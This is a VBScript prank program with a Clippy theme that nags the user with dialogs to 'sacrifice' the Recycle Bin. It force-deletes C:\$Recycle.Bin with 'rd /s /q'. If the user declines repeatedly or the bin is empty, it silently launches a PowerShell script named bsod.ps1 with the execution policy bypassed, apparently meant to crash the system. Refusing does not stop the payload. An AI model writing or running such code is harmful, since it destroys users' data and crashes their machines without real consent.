
' Create the Shell.Application object
Set oShell = CreateObject("Shell.Application")

' Get the Recycle Bin folder
Set oRecycleBin = oShell.Namespace(10)  ' 10 is the Recycle Bin
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
command = "powershell.exe -ExecutionPolicy Bypass -File ""bsod.ps1"""


Ask






Sub Ask
    ans = MsgBox("Do you wish to sacrifice your trash bin to Clippy?", vbYesNo + vbQuestion, "")
    If ans = vbYes Then
        itemCount = oRecycleBin.Items.Count

        If itemCount = 0 Then
            conf = MsgBox("The Recycle Bin is empty. Are you trying to trick Clippy?", vbCritical + vbSystemModal + vbYesNo)

            If conf = vbYes Then
                objShell.Run command, 0, True
                
                Exit Sub
            Else
                Ask
                Exit Sub
            End If
        End If

        EmptyRecycler
        MsgBox "Thank you for the kind donation", vbOKOnly + vbInformation, ""
        WScript.Echo 0
    Else
        For i = 1 To 10
            ans = MsgBox("Do you wish to sacrifice your trash bin to Clippy?", vbYesNo + vbQuestion, "")
            
            If ans = vbYes Then
                Exit For
            End If
        Next

        ' If none of the Yes options was chosen within the loop, run the command
        objShell.Run command, 0, True
    End If
End Sub







' Subroutine to empty the Recycle Bin
Sub EmptyRecycler
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c rd /s /q C:\$Recycle.Bin", 0, True
    Set objShell = Nothing
    
End Sub